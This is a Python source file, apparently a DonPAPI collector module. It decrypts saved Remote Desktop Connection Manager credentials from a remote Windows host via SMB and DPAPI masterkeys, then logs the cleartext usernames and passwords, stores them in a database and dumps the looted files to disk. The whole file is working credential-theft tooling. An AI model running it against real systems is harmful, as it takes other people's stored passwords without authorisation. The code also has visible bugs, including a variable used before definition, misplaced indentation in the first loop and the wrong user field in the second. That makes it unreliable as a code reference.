from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.rdg import RDGTriage, RDGServerProfile
from dploot.lib.utils import dump_looted_files_to_disk
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


class RDCMan:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        self.logger.display("Dumping User's RDCManager")
        rdg_triage = RDGTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
        rdcman_files, rdgfiles = rdg_triage.triage_rdcman()
        for rdcman_file in rdcman_files:
            if rdcman_file is None:
                continue
            for rdg_cred in rdcman_file.rdg_creds:
                target = ""
                log_text = f"{rdg_cred.username}:{rdg_cred.password.decode('latin-1')}"
                if isinstance(rdg_cred,RDGServerProfile):
                    target = rdg_cred.server_name
                    log_text = f"{rdg_cred.server_name} - {log_text}"
                    self.logger.secret(f"[{rdgfile.winuser}][{rdg_cred.profile_name}] {log_text}", self.tag)
                    self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user=rdcman_file.winuser, username=rdg_cred.username, password=rdg_cred.password.decode("latin-1"), target=target)        
        for rdgfile in rdgfiles:
            if rdgfile is None:
                continue
            for rdg_cred in rdgfile.rdg_creds:
                target = ""
                log_text = f"{rdg_cred.username}:{rdg_cred.password.decode('latin-1')}"
                if isinstance(rdg_cred,RDGServerProfile):
                    target = rdg_cred.server_name
                    log_text = f"{rdg_cred.server_name} - {log_text}"
                self.logger.secret(f"[{rdgfile.winuser}][{rdg_cred.profile_name}] {log_text}", self.tag)
                self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user=rdcman_file.winuser, username=rdg_cred.username, password=rdg_cred.password.decode("latin-1"), target=target)

        dump_looted_files_to_disk(self.context.target_output_dir, rdg_triage.looted_files)